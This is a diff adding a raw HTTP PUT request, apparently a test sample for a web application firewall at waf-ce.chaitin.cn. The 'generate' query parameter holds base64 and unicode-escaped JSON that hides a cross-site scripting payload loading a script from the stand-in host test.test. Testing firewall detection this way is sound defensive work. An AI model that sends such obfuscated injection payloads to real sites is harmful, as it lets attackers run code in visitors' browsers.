@@ -1,0 +1,13 @@
+PUT /prefix/miscellaneous/faceted%20search/escalate/compliance?tolerance=render&expenditure=consultative&overview=catastrophic%20failover&generate=WyBbZmFsc2UgDV0KLA0iXHUwMDNDXHUwMDczXHUwMDYzXHUwMDcyXHUwMDY5XHUwMDcwXHUwMDc0XHUwMDIwXHUwMDczXHUwMDcyXHUwMDYzXHUwMDNEXHUwMDIyXHUwMDY4XHUwMDc0XHUwMDc0XHUwMDcwXHUwMDNhXHUwMDJmXHUwMDJGXHUwMDc0XHUwMDY1XHUwMDczXHUwMDc0XHUwMDJlXHUwMDc0XHUwMDY1XHUwMDczXHUwMDc0XHUwMDJmXHUwMDIyXHUwMDNFXHUwMDNDXHUwMDJmXHUwMDczXHUwMDYzXHUwMDcyXHUwMDY5XHUwMDcwXHUwMDc0XHUwMDNFIiwJMTUNLAoiXHUwMDczXHUwMDYzXHUwMDY1XHUwMDZlXHUwMDYxXHUwMDcyXHUwMDY5XHUwMDZmIix7CiAiXHUwMDY2XHUwMDc1XHUwMDcyXHUwMDc0XHUwMDY4XHUwMDY1XHUwMDcyXHUwMDZkXHUwMDZmXHUwMDcyXHUwMDY1Ig06DQl0cnVlDSwiXHUwMDYxXHUwMDcyXHUwMDYyXHUwMDY5XHUwMDc0XHUwMDcyXHUwMDYxXHUwMDcyXHUwMDc5IjoJZmFsc2UJfQld HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Cookie: mapping=worker; redacted=prefix; SESSIONID=fa1b465eafe6501d0622b4c81f0ce51c34b228cc3bc2d74df8432097324bd655c3fbf8f3cedb354abf2fbd8015bd8b20
+
